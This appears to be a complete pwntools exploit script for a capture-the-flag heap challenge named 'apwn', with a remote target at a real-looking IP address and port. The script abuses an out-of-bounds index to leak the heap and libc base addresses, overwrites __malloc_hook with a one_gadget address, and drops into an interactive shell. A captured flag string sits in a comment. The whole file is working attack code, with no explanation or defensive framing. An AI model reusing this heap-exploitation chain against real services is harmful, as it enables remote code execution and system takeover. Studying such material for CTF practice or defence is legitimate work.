from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./apwn")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
	elf = ELF("./apwn")
else:
	p = remote("211.159.175.39","8686")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
	elf = ELF("./apwn")

def addsingle(name):
	p.sendafter(">>\n","1")
	p.sendafter("Name:\n",name)

def addlucky(name,pname):
	p.sendafter(">>\n","2")
	p.sendafter("Name\n",name)
	p.sendafter("name\n",pname)
	
def editsingle(index,name):
	p.sendafter(">>\n","3")
	p.sendafter("which?\n",str(index))
	p.sendafter("luck.\n",name)

def editlucky(index,name,pname):
	p.sendafter(">>\n","4")
	p.sendafter("which?\n",str(index))
	p.sendafter("name?\n",name)
	p.sendafter("name\n",pname)

def save():
	p.sendafter(">>\n","5")

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x1109)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
#debugf()
addsingle(p64(0) + p64(0x20 + 0x30*70 + 1))
addlucky("l1","lp1")
editsingle(80,"a")
p.recvuntil("new name: ")
heap_addr = u64(p.recv(6).ljust(8,"\x00"))
heap_base = heap_addr - 0x61
log.success("heap_base:"+hex(heap_base))
if debug:
    editsingle(80,p64(heap_base + 0x80))
else:
    editsingle(80,p64(heap_base + 0x70))
for i in range(70):
    addsingle("s{i}".format(i=i))
#debugf()
save()
addsingle("a")
addsingle("b")
editsingle(71,"b"*8)
p.recvuntil("b"*8)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 96 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))
#raw_input()
editsingle(80,p64(libc.symbols["__malloc_hook"]))
one_gadget = libc.address + 0x10a38c
editlucky(0,"s",p64(one_gadget))
p.sendafter(">>\n","1")
#flag{eiwe823kdkuwewl4iu3lsdu8234siwe7}
p.interactive()
	
